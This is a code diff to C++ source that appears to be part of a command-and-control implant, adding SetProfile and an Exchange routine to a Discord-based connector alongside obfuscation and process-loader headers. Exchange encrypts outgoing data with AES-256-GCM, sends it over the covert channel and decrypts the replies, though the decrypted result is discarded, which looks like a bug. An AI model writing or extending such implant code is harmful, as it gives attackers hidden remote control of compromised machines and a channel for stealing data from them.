@@ -4,6 +4,7 @@
 #include "Obfuscate.h"
 #include "ProcLoader.h"
 #include "Encoders.h"
+#include "Crypt.h"
 #include "utils.h"
 #include "config.h"
 #include "DebugLog.h"
@@ -876,7 +877,38 @@ void ConnectorDiscord::CloseConnector()
 
 	if (this->functions) {
 		memset(this->functions, 0, sizeof(DISCORDFUNC));
-		// functions was allocated with LocalAlloc inside constructor,
-		// but ApiWin may be gone at this point; skip free
+	}
+}
+
+
+// ============================================================================
+// Connector interface implementation
+// ============================================================================
+
+BOOL ConnectorDiscord::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
+{
+	ProfileDiscord* prof = (ProfileDiscord*)profilePtr;
+	return this->SetConfig(*prof, beat, beatSize);
+}
+
+void ConnectorDiscord::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+	if (plainData && plainSize > 0) {
+		int encLen;
+		unsigned char* encData = EncryptAES256GCM(plainData, plainSize, sessionKey, &encLen);
+		this->SendData(encData, encLen);
+		MemFreeLocal((LPVOID*)&encData, encLen);
+	}
+	else {
+		this->SendData(NULL, 0);
+	}
+
+	if (this->recvSize > 0 && this->recvData) {
+		int dataSize = this->RecvSize();
+		BYTE* dataPtr = this->RecvData();
+		if (dataSize > 0 && dataPtr) {
+			int plainLen;
+			DecryptAES256GCM(dataPtr, dataSize, sessionKey, &plainLen);
+		}
 	}
 }
